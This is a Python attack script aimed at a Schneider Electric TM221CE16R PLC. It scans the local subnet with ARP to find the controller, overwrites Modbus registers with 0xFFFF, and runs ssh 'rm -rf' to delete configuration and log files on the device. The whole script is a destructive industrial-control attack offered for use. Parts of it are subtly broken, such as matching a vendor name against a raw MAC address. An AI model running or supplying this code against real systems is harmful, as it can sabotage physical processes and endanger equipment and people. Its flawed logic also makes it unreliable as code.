from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient
import time
import os

# Network details (Modify for your subnet)
NETWORK_RANGE = "192.168.1.0/24"

def find_plc_ip():
    """
    Scans the network to find the Schneider Electric TM221CE16R PLC.
    Assumes it exists in the local subnet.
    """
    print("[*] Scanning for PLC on the network...")
    arp_request = ARP(pdst=NETWORK_RANGE)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=3, verbose=False)[0]

    for sent, received in result:
        if "SchneiderElectric" in received.hwsrc:
            print(f"[+] PLC Found: {received.psrc} (MAC: {received.hwsrc})")
            return received.psrc  # Return the detected PLC IP

    print("[-] PLC not found. Exiting.")
    exit()

def destructive_attack(plc_ip):
    """
    Connects to the PLC and issues destructive commands.
    - Clears important registers
    - Erases system memory or log files (if accessible)
    """
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip)

    if not client.connect():
        print(f"[-] Failed to connect to PLC at {plc_ip}.")
        return

    print("[+] Connected to PLC!")

    # Example: Overwriting critical registers (Adjust addresses based on actual PLC)
    CRITICAL_REGISTERS = [0x1000, 0x1001, 0x1002, 0x1003]  # Modify according to system registers

    for reg in CRITICAL_REGISTERS:
        client.write_register(reg, 0xFFFF)  # Injects destructive values
        print(f"[!] Overwriting Register {hex(reg)} with 0xFFFF")

    # OPTIONAL: If the PLC has file system access, attempt file deletion
    FILES_TO_DELETE = ["/usr/data/logs.log", "/usr/config/settings.conf"]

    for file in FILES_TO_DELETE:
        print(f"[!] Attempting to delete {file} (If supported)")
        os.system(f"ssh admin@{plc_ip} 'rm -rf {file}'")  # Requires known credentials

    print("[*] Attack executed. Disconnecting...")
    client.close()

# Execute attack
plc_ip = find_plc_ip()
destructive_attack(plc_ip)
print("[!] Destruction Process Completed.")